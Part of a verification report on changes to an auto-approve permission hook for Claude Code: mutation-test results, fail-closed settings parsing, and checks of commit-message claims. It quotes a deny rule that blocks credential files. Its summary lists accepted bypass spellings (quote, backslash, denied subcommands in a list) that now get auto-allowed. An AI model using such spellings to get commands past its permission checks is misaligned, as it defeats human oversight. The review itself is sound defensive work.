**Location:** `test/auto-approve-allowed-commands.bats:172-182`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the test failing against a hook that reads deny rules (unit 1's tip used as the mutant). Does not cover the Claude Code half of the comment beyond Q-082.

The test sets global deny `Bash(*.credentials.json*)` and bare `Bash`, and project deny `Bash(ls:*)` next to allow `Bash(curl:*)`, `Bash(ls:*)`. It asserts `approved` for `$PLAIN` and `ls -la`. Mutant M4 (the whole 5ba83a3a hook, which still has the deny reader) was killed: `not ok 1 deny rules in the settings files no longer change …` (`$A/mutants.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:172-182`, `$A/mutants.log`

---

## Claim 22: "settings files of the wrong shape fail closed" (loop)

**Location:** `test/auto-approve-allowed-commands.bats:206-218`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the loop catching three separate weakenings of the check. Does not cover the NUL and non-string cases, which other tests own (Claims 23, 24).

Mutants M5 (`permissions: null` read as absent), M6 (`ask` left out of the key list) and M7 (`.[$k] // []`, so null and false read as absent) were each killed by this test (`$A/mutants.log`). Each loop failure prints the shape that slipped through: `not_approved || { echo "approved with global settings: $bad"; return 1; }`.

**Evidence:** `test/auto-approve-allowed-commands.bats:206-218`, `$A/mutants.log`

---

## Claim 23: "non-string rule entries are skipped, as Claude Code drops them, not refused"

**Location:** `test/auto-approve-allowed-commands.bats:220-224`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook half of the title. "As Claude Code drops them" is Claim 9b.

The fixture is `{"permissions":{"allow":[5,"Bash(ls:*)"],"deny":[1],"ask":[{}]}}`, followed by `approved`. Mutants M10 (any non-string fails closed), M11 (non-string deny fails closed, the old behavior) and M12 (`contains`) were killed (`$A/mutants.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:220-224`, `$A/mutants.log`

---

## Claim 24: "a NUL inside a settings deny or ask rule fails closed"

**Location:** `test/auto-approve-allowed-commands.bats:290-298`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers deny and ask separately. NUL in allow is a separate test at `:280`.

Mutant M8 (NUL check removed) and M9 (NUL and shape check limited to allow and deny, so a NUL in ask is unchecked) were killed. The loop body names the key that failed (`echo "approved with a NUL in $k"`) (`$A/mutants.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:290-298`, `$A/mutants.log`

---

## Claim 25: Linker test comment: "Claude Code applies it even after the auto-approve hook says allow (host test Q-082), so the hook no longer reads it (Q-092)."

**Location:** `test/link-claude-home-wiring.bats:266-270`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook half and the citation. The test body checks only that the linker merges the rule (R2 passes). It does not test the hook.

Same evidence as Claims 5 and 21. R2 16/16 (`$A/bats-link.log`).

**Evidence:** `test/link-claude-home-wiring.bats:266-275`, `$A/bats-link.log`

---

## Claim 26a: Commit ed06dec1: "DENY_GLOBS, add_deny_rule, matches_deny and both of its calls are gone … The hook emits only \"allow\" or nothing … (pinned in unit 1) … A relative or newline-bearing CLAUDE_CONFIG_DIR still approves nothing … With --permissions the settings files are no longer read … the rule table keeps its allow column only … No gate trailer: hooks/, test/, guides/ and docs/ are outside live-verify-gate's sets. wiring.json changes only _comment, which the linker does not merge."

**Location:** commit ed06dec1 message
**Type:** Behavioral / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each listed statement against HEAD and the gate regexes. Does not cover the "array of strings" clause (Claim 26b).

The diff removes both `matches_deny` calls (raw at old main, per extracted command in the loop). The stdout test sits in diff context, so unit 1 added it. The gate sets are `enforcement='^devcontainer-config/(Dockerfile|…|egress/)'` and `host_tools='^devcontainer-config/(cc-exit-scan\.sh|cc-gitdir\.sh|cc-push\.sh)'` (`hooks/live-verify-gate.sh:83`, `:91`). Neither matches hooks/, test/, guides/ or docs/. For the rest, see Claims 11, 12, 15 and 18.

**Evidence:** `hooks/live-verify-gate.sh:83-93`, `devcontainer-config/link-claude-home.sh:135`, `$A/bats-hook.log`

---

## Claim 26b: Commit ed06dec1: "It still fails closed on its inputs: an unreadable or ill-shaped settings file, including a permissions.deny that is not an array of strings, leaves no allow rules."

**Location:** commit ed06dec1 message, paragraph 2
**Type:** Error-handling
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the claim at ed06dec1 and at HEAD. Does not reopen the later fixes, which fdae7834 and 72b8c825 made (and 0444b1ac narrowed).

At ed06dec1 the check was `elif ((.deny // []) | type != "array" or any(.[]; type != "string"))` (`git show ed06dec1:hooks/auto-approve-allowed-commands.sh`, SETTINGS_RULES_JQ). `deny: null` and `deny: false` became `[]` and passed. The same finding was raised in pass 1 (Claim 18 there) and fixed in code. At HEAD a non-string deny entry is skipped on purpose (0444b1ac). So "array of strings" was imprecise when written, and HEAD now reads "array, NUL-free strings, non-strings skipped". The history is accurate as a sequence. Nothing needs to change in code.

**Evidence:** `git show ed06dec1:hooks/auto-approve-allowed-commands.sh` (SETTINGS_RULES_JQ), `hooks/auto-approve-allowed-commands.sh:158-166`

---

## Claim 27: Commit fdae7834: "`permissions: null` was accepted as absent. A present permissions key must now be an object; a test case pins it."

**Location:** commit fdae7834 message
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the behavior change and the pinning test.

`if has("permissions") then .permissions else empty end` (`hooks/auto-approve-allowed-commands.sh:158`). P2: `{"permissions":null}` gives 0 prefixes. M5 restores the old null-as-absent form and is killed by the wrong-shape loop, which includes `'{"permissions":null}'` (`$A/mutants.log`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:158-159`, `test/auto-approve-allowed-commands.bats:209`, `$A/probe2.log`, `$A/mutants.log`

---

## Claim 28: Commit 0444b1ac: "Non-string entries in allow, deny and ask are now skipped; a non-array value or a NUL inside a string still fails closed. The NUL check uses test(\"\\u0000\") (pass-2 performance: ~10x faster than explode at scale; contains() is wrong on jq 1.6) … jq also accepts NaN/Infinity … deny:[1] used to fail closed (before this stack) and is now skipped"

**Location:** commit 0444b1ac message
**Type:** Behavioral / Performance
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each factual statement. "~10x" holds net of jq startup. End to end, wall-clock time including startup is ~6x. The Claude Code half of the binary-reading note is Claim 9b.

P5 used 6000 allow rules (`$A/probe5.log`): explode 175–180 ms, test 29–31 ms, baseline `.permissions.allow | length` 16–17 ms. Net of startup that is ~160 ms against ~13 ms (~12x). `contains`: Claim 14. NaN/Infinity: Claim 10a. `deny:[1]`: P5 gives `hook-pre-00a27a2f.sh: <none>` against HEAD `allow`. For skipping and fail-closed: Claims 8 and 9a.

**Evidence:** `$A/probe5.log`, `$A/probe2.log`, `$A/probe6.log`

---

## Claim 29: Size figures: "Unit size vs unit 1 is 409 (loop tolerance ~800)" (72b8c825), and the 420 and 436 figures named for this pass

**Location:** commit 72b8c825 message (merge; outside `--no-merges`, checked for the figure only)
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the figure for each base and tip pair. Does not cover the "~800" tolerance policy, which is a workflow rule, not code. Also, 72b8c825's other statements ("an array of NUL-free strings", "Non-string allow entries now fail closed") were true at that commit, and 0444b1ac reversed them, saying so in its own message.

Command: `git diff --numstat <base>..<sha> -- ':(top)' ':(top,exclude)docs/' | awk '{n+=$1+$2} END{print n}'` (output shown in this session). Unit 1's tip moved b973e678 → dbb15ec6 → 5ba83a3a. Results:

| tip \ base | b973e678 (base when 72b8c825 was written) | dbb15ec6 / 5ba83a3a (current) |
|---|---|---|
| 72b8c825 | **409** | 413 |
| fdae7834 | 416 | **420** |
| 0444b1ac | 432 | **436** |
| 73698a91 | 432 | **436** |

409 is correct against the base at the time. The current full-unit size is 436: 10 guides, 270 hook, 8 wiring.json, 143 hook test, 5 linker test.

**Evidence:** command output above (run 2026-10-15T12:29Z, cwd `/workspace/.claude/wt-q092`, exit 0)

---

## Claim 30: No live text still says the hook reads deny rules

**Location:** repo-wide (excluding docs/reviews, archive, docs/working/questions*)
**Type:** Staleness
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the phrasings searched for: "deny check/reader", "WHAT THE DENY", `matches_deny`, `DENY_GLOBS`, `add_deny_rule`, `--deny`, and auto-approve near deny/credential/backstop. Does not cover paraphrases those searches would miss. Also, unit 1's plan (`docs/working/plan-q092-drop-hook-deny-reader.md:41`, F6) still says U2 makes each list "an array of NUL-free strings", which 0444b1ac narrowed to skip non-strings. That plan describes the removal; it does not say the hook reads deny rules.

Remaining hits are historical or accurate. `hooks/auto-approve-allowed-commands.sh:84` reads "the deny reader used to cover that case" (past tense). Row 53's 2026-09-27 amendment is superseded by its own 2026-10-15 amendment. The `--deny` test asserts the option is ignored. The guard-trusted-writes.py hits describe that hook's own defer-to-deny design (paraphrased — no quote available because these are many hits across unrelated files; command and output shown in this session).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:84`, `docs/decisions/log.md:76`, `test/auto-approve-allowed-commands.bats:184-188`

---

## Claims Requiring Attention

### Incorrect
None.

### Stale
None.

### Mostly Accurate
- **Claim 1b** (`docs/decisions/log.md:76`): "now also when `permissions` is present but not an object, or allow/deny/ask … not an array or … a NUL" overstates what is new. Before, the only cases that passed were `permissions: null`, `allow`/`deny` null or false, and anything under `ask`. Wording only.
- **Claim 3b** (`hooks/auto-approve-allowed-commands.sh:51`): "exit 0 with no output". On malformed hook input (non-JSON, non-object `tool_input`) the hook exits 4 or 5 with empty stdout, never 2. Claude Code never sends such input.
- **Claim 26b** (commit ed06dec1 message): "a permissions.deny that is not an array of strings" fails closed. At that commit null and false passed. At HEAD non-strings are skipped on purpose. Historical; already fixed in code.

### Unverifiable
- **Claim 4** (`hooks/auto-approve-allowed-commands.sh:53-54`): issue #39344 (hook `ask` overrides deny). Needs egress or a host run. Not load-bearing, since the hook never asks.
- **Claim 7b** (`hooks/auto-approve-allowed-commands.sh:70-72`, `guides/bare-host-hook-wiring.md:159-160`, `hooks/wiring.json:44-45`, `docs/decisions/log.md:76`): Claude Code's matcher letting `.c*` through. Needs a host run. Accepted (F5, C7).
- **Claim 9b** (`hooks/auto-approve-allowed-commands.sh:80-81`, test title `:220`, log row 53, commit 0444b1ac): Claude Code drops non-string entries with a warning and keeps the file. Read from the 2.1.300 binary, not run.
- **Claim 10b** (`hooks/auto-approve-allowed-commands.sh:78-83`, log row 53): which values make Claude Code drop a whole file. Accepted residual (C10).

---

## Goal-Alignment Note

The goal is to land Q-092 as two stacked units, each reviewed clean. This pass covers unit 2 in full. The code does what the unit says. The hook prints only the allow JSON or nothing on every exit path, and it never exits 2. A test catches an `ask` emission even when the string is built at runtime. Deny rules no longer affect the decision. The bypass family that changed (quote and backslash spellings, a denied subcommand in a list) is exactly the accepted F3/F4: those went from prompt (pre-stack) to allow, and the quote spellings were already allow at unit 1's tip. Glob and earlier-variable spellings were allow before and still are. Nothing beyond the known-and-accepted list was found. One small edge carries over from before this unit: a dangling symlink at a settings path counts as absent. Fail-closed loading holds under jq 1.6 for every shape named, including discarding records printed before a later file's error. Every new or changed test kills the mutant it guards (12 of 12). Nothing is Incorrect or Stale. The three Mostly-accurate items are wording only: a "now also" in row 53, the exit-status parenthetical in ROLE, and a historical commit-message clause already fixed in code. The four Unverifiable items are Claude Code host behavior the unit already records as residuals. None of them blocks the merge. Unit 1's plan F6 still says "an array of NUL-free strings" for U2, which 0444b1ac narrowed. That is outside this unit's diff, and a one-line note there would fix it.
